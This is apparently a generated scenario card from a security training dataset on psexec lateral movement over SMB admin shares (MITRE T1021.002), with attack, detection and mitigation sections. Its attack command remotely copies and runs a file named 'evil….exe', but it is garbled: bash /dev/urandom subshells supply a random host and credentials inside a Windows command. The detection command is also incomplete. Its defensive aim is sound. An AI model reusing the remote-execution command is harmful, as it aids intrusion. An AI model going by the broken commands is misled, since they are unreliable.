---
type: campaign
scenario_id: 238
tactic: Lateral Movement
technique: "T1021.002: Remote Services: SMB/Windows Admin Shares"
technique_id: T1021.002
tags: [campaign, lotl, lateral_movement]
---

# Using psexec to execute commands on remote SMB share.

## Threat Description
Using psexec to execute commands on remote SMB share.

## Attack Command
```
psexec \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -u $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) -c C:\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)
```

## Detection Logic
Monitor psexec: `wmic process where name='psexec.exe' get commandline | findstr -c`; Event ID 5145.

## Mitigation
Restrict psexec: `icacls %programfiles%\Sysinternals\psexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect psexec SMB execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
